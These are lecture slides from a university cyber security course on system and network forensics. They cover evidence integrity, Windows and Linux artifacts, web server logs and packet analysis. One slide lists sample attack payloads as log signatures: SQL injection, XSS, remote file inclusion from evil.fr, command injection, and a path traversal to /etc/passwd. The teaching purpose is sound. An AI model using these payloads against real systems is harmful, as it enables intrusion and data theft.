# INF 2005 - Cyber Security Fundamentals
**Dr Aris Cahyadi Risdianto**

## System and Network Forensics

---

## What is (Digital) Forensics?

- **Forensics:** The application of science to legal problems and investigations.
- **Digital forensics:** A branch of forensics involving the recovery and investigation of digital evidence.
- **Digital evidence:** Data stored or transmitted using a digital device (e.g., computer, storage, network, and mobile)
  - Computer Forensics
  - Storage Forensics
  - Network Forensics
  - Mobile Forensics

*The slides is adopted from the "Digital Forensic" lecture notes by Raj Jain from Washington University in Saint Louis*

---

## Use Case Example

A serial murder investigation was conducted in St Louis. A reporter received a letter that was printed with a map and with a hand-drawn X to mark where another body could be found.

The police noticed the map was taken from Expedia.com. They contacted Expedia.com, which looked for IP addresses that had accessed that map around the day the letter was postmarked. They found only one, the ISP responsible for that IP address was then contacted and the police found the dialup account and telephone number used to access it, which belonged to a Maury Travis. The police arrested him, searched his home, found incriminating evidence in his home.

---

## What Digital Evidence?

- E-mail
- Credit card data
- Accounting software and files
- Notes
- Images
- Internet history
- IP addresses
- Logs
- Malware …

### Evidence From Where?

Image slide: laptop, desktop PC, tablets, game consoles, smartphones, network/server infrastructure, cloud, Oyster-type transit card, digital camera.

### Where to Start?

Image slide: a tangled mess of cables, devices and equipment.

---

## Evidence Integrity

Throughout, you also want to maintain the integrity of the data.

The purpose is to demonstrate that the evidence you collected is the evidence that is analysed and presented (i.e., it hasn't been tampered with)

Diagram: documents (Word/PDF), source code, and a hard drive → **Hash function** → e.g., `1458h89573ih89527r39k1325d5j82j6`

**MD5 --> SHA-1/2 --> SHA-256**

**How do you deal with collisions?**

---

## Process Models

There's no one standard process model for digital forensics investigations.

One example process is by Mark M. Pollit (based on a law):

- **Acquisition** of evidence in a lawful manner
- **Identification** aims to identify and collect the digital data that can be used as evidence
- **Evaluation** of the data relevant to the case, and whether it can be used in a case
- **Admission** of the evidence to be presented in the court of law

Flow: Acquisition → Identification → Evaluation → Admission

**Preservation of Evidence**

---

## System/Computer Forensics

*The slides are adopted from the "Digital Forensic and Incident Response" lecture notes by Diogo Barradas from the University of Waterloo*

### Computer Forensics

Diagram (source: "File System Forensic Analysis", Brian Carrier): Physical Storage Media Analysis → Volume Analysis → File System Analysis → Application Analysis; Volume Analysis → Database Analysis; Volume Analysis → Swap Space Analysis; Physical Storage Media Analysis → Memory Analysis → Swap Space Analysis; Network Analysis (separate).

- Why is the operating system relevant in forensics?
- What kind of evidentiary artifacts may be useful?
- Where to locate those artifacts?

### Operating System (OS) Forensics

Diagram: timeline of OS Loading → OS Initialization → User Authentication → User Session(s). Components shown: ROM (boot loader code); RAM (volatile memory: boot loader code & data, kernel in-memory data structures, system services' processes and shared libraries, application process); Persistent Storage (File System: boot loader code, kernel code, service executables, system configurations, logs, temporary files, app executable file, app config file, app data file).

Artifacts of interest:

1. File download
2. Program execution
3. File opening/creation
4. Deleted files
5. Physical device location
6. USB or drive storage
7. Account usage
8. Network usage

- Forensic examination needs to investigate the actions of a user (real/bot)
- Every event is the result of a user either doing something (or not doing something)
- Many events introduce changes to the system state that are supervised by the OS
- Forensics helps to understand how system changes correlate to events resulting from the actions of users

### OS-based Evidences

**Linux**
- Configuration files
  - `/etc/passwd`
  - `/etc/sudoers`
  - `/etc/inittab`
  - `/var/spool/cron/*`
- Log files
  - `/var/log/boot.log`
  - `/var/log/auth.log`
  - …

**Windows**
- Dedicated data structures
  - Windows Registry
- System logging service
  - Windows Event log
- Special files

---

## Windows OS Forensics

- Windows Registry.
- Event logs.
- Link files.
- Recycle Bin
- Application Metadata: E.g., Microsoft Office
  - List of the last 10 authors.
  - A list of revisions, along with who made them, if "track changes" is on.
  - Hidden annotations and comments.
  - Created, last written, and accessed times.
- Browser History and Cache
- Prefetch Files: Stored in `C:\Windows\Prefetch\*.p`

*Source: CS 798: Digital Forensics and Incident Response, Lecture 10 - Evidence in Operating Systems*

### Windows OS Forensics: Registry

The registry is the heart and soul of Windows OS, and a wealth of information can be recovered (e.g., System configuration, usernames, personal settings, browser preferences, web browsing activity, files opened, programs executed, and applications' settings).

Registry Editor screenshot labels: **Hives** (HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG), **Keys** (e.g., HARDWARE, SAM, SECURITY, SOFTWARE, SYSTEM → ControlSet001, ControlSet002, CurrentControlSet, LastKnownGoodRecovery, MountedDevices, Select, Setup, WPA), **Values** (Default, Current, Default, Failed, LastKnownGood), **Type** (REG_SZ, REG_DWORD), **Data** (e.g., 0x00000001 (1), 0x00000002 (2)).

- The Registry can be seen as a **unified file system**
- The Registry's specific structure is divided into **key and value**
- Main root keys (hives) represent the root directory, sub-keys represent the subfolders, and values represent the files

### Windows OS Forensics: Event Viewer

Event Viewer screenshot: Application, Security, System and Internet Explorer logs, with Type (Information/Error), Date, Time, Source (MsiInstaller, .NET Runtime, Microsoft Office 11, Application Hang, Winlogon, MSSQL$SQLEXPRESS, .NET Runtime Optimization), Category and Event ID columns.

- The last login time will be stored in the registry key **SAM\Domains\Account\Users**
- Saves the last time a user's password has been changed
- Successful or failed logons **\%systemroot\%\System32\winevt\logs\Security.evtx**

### Linux OS Forensics

- No registry
  - Must gather system info from scattered sources
- Different file system
  - No file creation dates (until EXT4)
- Different metadata
  - updated when files are deleted
- Files/data are mostly plain text
  - Good for string searching and interpreting data
- Basic user data in `/etc/passwd`
- UID 0 account has admin privs
- Password hashes in `/etc/shadow`
  - (brute force with "John the Ripper")
- Group memberships in `/etc/group`
- Login history: `/var/log/wtmp`
  - Shows user, source, time, and duration of login
  - Need to use the Linux `last` command to view
- Other logs that may contain useful data:
  - `/var/log/auth.log`
  - `/var/log/secure`
  - `/var/log/audit/audit.log`

---

## Network-based Evidence

- **Wireless access points** - easy to eavesdrop on traffic, and usually, management traffic is not encrypted
- **Switches** - contain a mapping table between ports and MAC addresses, and traffic can also be captured
- **Routers** - contain a mapping for ports to networks and can do packet filtering
- **DHCP servers** – the logs contain leased IP addresses by MAC address mappings
- **Authentication (AAA) servers** - log successful/failed login attempts for all devices within their authentication domains
- **Network intrusion detection/prevention systems (NIDS/NIPS)** - detect attacks in progress with tunable granular data
- **Firewalls** - can keep logs of the sessions, which can serve as digital evidence.
- **Web proxy** - can store web surfing logs for the entire organization.

### Web Server Log

Web server logs provide extremely useful information for forensic investigators.

Diagram: Client Web Browser ↔ (HTTP Request/Response) Internet/Intranet ↔ Web Server ↔ (SQL Query/Result Set) Database Server; logs kept at the Application, Web server and Database levels.

Attack signatures visible in request logs:

- SQL Injection: `/product.asp?id=0%20or%201=1`
- XSS: `/forum.php?post=<script>alert(1);`
- Remote file inclusion: `/include/?file=http://evil.fr/sh`
- Command execution: `/lookup.jsp?ip=|+ls+-l`
- Buffer overflow: `/cgi-bin/Count.cgi?user=a\x90\xbf8\xee\xff`

**Pattern indicates attacks**

### Web Server Log (example)

Code injection attack demo (page "Code Injection Attack", input `show_source("passprotect.php");` reveals the page's JavaScript password-checking source) alongside an access log excerpt:

```
134.147.23.42 - - [13/Mar/2012:20:58:25 +0100] "GET /webapp.php?page=news HTTP/1.1" 200 36312
134.147.61.15 - - [13/Mar/2012:21:02:13 +0100] "GET /webapp.php?page=blog HTTP/1.1" 200 27140
134.147.12.77 - - [13/Mar/2012:20:58:25 +0100] "GET /webapp.php?page=index HTTP/1.1" 200 30745
134.147.12.77 - - [13/Mar/2012:20:58:29 +0100] "GET /webapp.php?page=news HTTP/1.1" 200 36312
212.32.45.167 - - [13/Mar/2012:21:05:42 +0100] "GET /webapp.php?page=../../etc/passwd HTTP/1.1" 200 2219
134.147.12.131 - - [13/Mar/2012:20:58:29 +0100] "GET /webapp.php?page=wiki HTTP/1.1" 200 73141
```

(The `page=../../etc/passwd` request from 212.32.45.167 is highlighted as the suspicious entry.)

### Network Trace

A network trace is a linearized bit-copy of collected data exchanged over the network, which can be used for packet analysis, flow analysis, and protocol analysis.

Diagram: computer network → network trace file (`0101011010111110000…`)

- Detection of potential and actual attacks (e.g., port scanning, DoS attacks)
- Protocol reverse engineering (e.g., analysis of botnet chatter, or proprietary protocols)
- Inspect the communications (e.g., intercept message exchanges, carve out file transmissions)
- Detect payload patterns (e.g., website fingerprinting, DRM-protected content, TOR traffic)

### Network Trace: Sniffer

- **A.** Connect the sniffer to a **hub**
- **B.** Connect to **switch**'s SPAN port
- **C.** Use a **network tap** on the ingress connection side of the switch

(Diagrams show Source A, Destination B and the Sniffer in each setup.)

### Packet Analysis

Packet analysis involves the examination of the contents and/or metadata of one or more packets individually or together:

- Identify packets of interest and develop a strategy for flow analysis or content reconstruction
- There are many tools available for packet analysis, e.g., **Wireshark (and tshark), ngrep,**

Techniques:

- **Parsing protocol fields** - Extract the contents of protocol fields within packets of interest (e.g., obtain TCP fields of packets)
- **Packet filtering** - Separate packets based on the values of fields in protocol metadata (e.g., filter interesting conversation snippet)
- **Pattern matching** - Identify packets of interest by matching specific values within the packet capture (e.g., keyword search

Diagram: encapsulation across layers – Application data → Application Layer (FTP, SMTP, SNMP …) → Transport Layer (TCP, UDP) → Internet Layer (IP, ICMP, IGMP) → Link Layer (Ethernet, X.25, ARP, OSPF, NDP …), each adding a header.

### Packet Analysis: HTTP Request

Wireshark capture (`csf-trace-publico.pcapng`), frame 401, 544 bytes on wire: source 146.193.41.201 → destination 193.136.128.7, protocol HTTP, Ethernet II (Src Apple_a5:5c:cd, Dst IntelCor_10:74:a1), IPv4, TCP (Src Port 52907, Dst Port 3128). HTTP payload:

```
GET http://www.publico.pt/ HTTP/1.1\r\n
Host: www.publico.pt\r\n
Proxy-Connection: keep-alive\r\n
Upgrade-Insecure-Requests: 1\r\n
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, lik...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n
Accept-Encoding: gzip, deflate, sdch\r\n
Accept-Language: en-US,en;q=0.8,it;q=0.6,pt;q=0.4\r\n
If-Modified-Since: Thu, 30 Mar 2017 10:27:55 GMT\r\n
\r\n
[Full request URI: http://www.publico.pt/]
```

### Packet Analysis: Port Scan Detection

TCP header diagram (source port, destination port, sequence number, acknowledgment number, offset, reserved, TCP flags C E U A P R S F, window, checksum, urgent pointer, options) with flag reference: C 0x80 Reduced (CWR), E 0x40 ECN Echo (ECE), U 0x20 Urgent, A 0x10 Ack, P 0x08 Push, R 0x04 Reset, S 0x02 Syn, F 0x01 Fin.

**Vertical scan** – one source (holmes) sends SYN packets (S) to many ports on one host (watson):

```
13:21:45.010117 holmes.4033 > watson.220: S 93266:93266(0) win 8192
13:21:45.011128 holmes.4003 > watson.ftp: S 92918:92918(0) win 8192
13:21:45.012014 holmes.4005 > watson.telnet: S 92946:92946(0) win 8192
13:21:45.013095 holmes.4004 > watson.22: S 92932:92932(0) win 8192
13:21:45.014107 holmes.4019 > watson.110: S 93094:93094(0) win 8192
13:21:45.015865 holmes.4010 > watson.63: S 93016:93016(0) win 8192
13:21:45.016763 holmes.4021 > watson.nntp: S 93106:93106(0) win 8192
13:21:45.018001 holmes.4016 > watson.80: S 93076:93076(0) win 8192
13:21:45.018456 holmes.4017 > watson.92: S 93154:93154(0) win 8192
13:21:45.018997 holmes.4034 > watson.396: S 93280:93280(0) win 8192
13:21:45.019562 holmes.4031 > watson.215: S 93238:93238(0) win 8192
13:21:45.020017 holmes.4002 > watson.17: S 92912:92912(0) win 8192
```

**Horizontal scan** – one source (foo.example.com) sends SYN packets to port 80 across many hosts:

```
13:21:45.012014 foo.example.com.1090 > 192.168.77.27.80: S 92946:92946(0) win 8192
13:21:45.013095 foo.example.com.1092 > 192.168.77.28.80: S 92932:92932(0) win 8192
13:21:45.014107 foo.example.com.1093 > 192.168.77.29.80: S 93094:93094(0) win 8192
13:21:45.015865 foo.example.com.1095 > 192.168.77.30.80: S 93016:93016(0) win 8192
13:21:45.016763 foo.example.com.1096 > 192.168.77.31.80: S 93106:93106(0) win 8192
13:21:45.018001 foo.example.com.1097 > 192.168.77.32.80: S 93076:93076(0) win 8192
13:21:45.018456 foo.example.com.1100 > 192.168.77.33.80: S 93154:93154(0) win 8192
13:21:45.018997 foo.example.com.1102 > 192.168.77.34.80: S 93280:93280(0) win 8192
```

---

## Gentle Reminder

- Tutorial and Lab on Thursday 9 AM and 11 AM
- Consultation sessions on Tuesday and Thursday will be based on request
- Please prepare the report ACW3 and submit before the dateline
- Have your ACW3 ready for demonstration and evaluation
